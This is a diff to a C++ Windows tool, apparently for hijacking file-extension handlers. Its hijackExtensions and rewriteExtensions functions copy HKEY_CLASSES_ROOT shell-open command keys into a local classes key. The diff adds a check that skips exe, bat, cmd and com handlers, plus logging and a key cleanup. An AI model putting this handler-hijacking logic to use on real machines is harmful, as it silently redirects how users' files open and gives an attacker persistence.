@@ -158,6 +158,7 @@ size_t hijackExtensions(std::string proxy_path)
         }
 
         std::string subKey = *itr;
+
         printf("[W] %s\n", subKey.c_str());
 
         std::vector<std::string> subkeys2 = get_subkeys(innerKey1);
@@ -253,6 +254,15 @@ bool rewrite_handler(HKEY localClassesKey, std::string handlerName)
     return copy_key(HKEY_CLASSES_ROOT, localClassesKey, handlerName + "\\shell\\open\\command");
 }
 
+bool is_blacklisted(std::string handlerName)
+{
+    if (handlerName == "exefile") return true;
+    if (handlerName == "batfile") return true;
+    if (handlerName == "cmdfile") return true;
+    if (handlerName == "comfile") return true;
+    return false;
+}
+
 size_t rewriteExtensions(std::string &local, std::set<std::string> &handlersSets)
 {
     HKEY localClassesKey = NULL;
@@ -263,14 +273,20 @@ size_t rewriteExtensions(std::string &local, std::set<std::string> &handlersSets
     std::set<std::string>::iterator hItr;
     for (hItr = handlersSets.begin(); hItr != handlersSets.end(); hItr++) {
         std::string handlerName = *hItr;
-        printf("%s\n", handlerName.c_str());
-        if (!key_exist(localClassesKey,  handlerName.c_str()) ) {
+        if (is_blacklisted(handlerName)) {
+            continue;
+        }
+        if (!key_exist(localClassesKey, handlerName.c_str()) ) {
             if (rewrite_handler(localClassesKey, handlerName)) {
                 added++;
             } else {
                 printf("Failed\n");
             }
+        } else {
+            printf("Already exist: ");
+            printf("%s\n", handlerName.c_str());
         }
     }
+    RegCloseKey(localClassesKey);
     return added;
 }
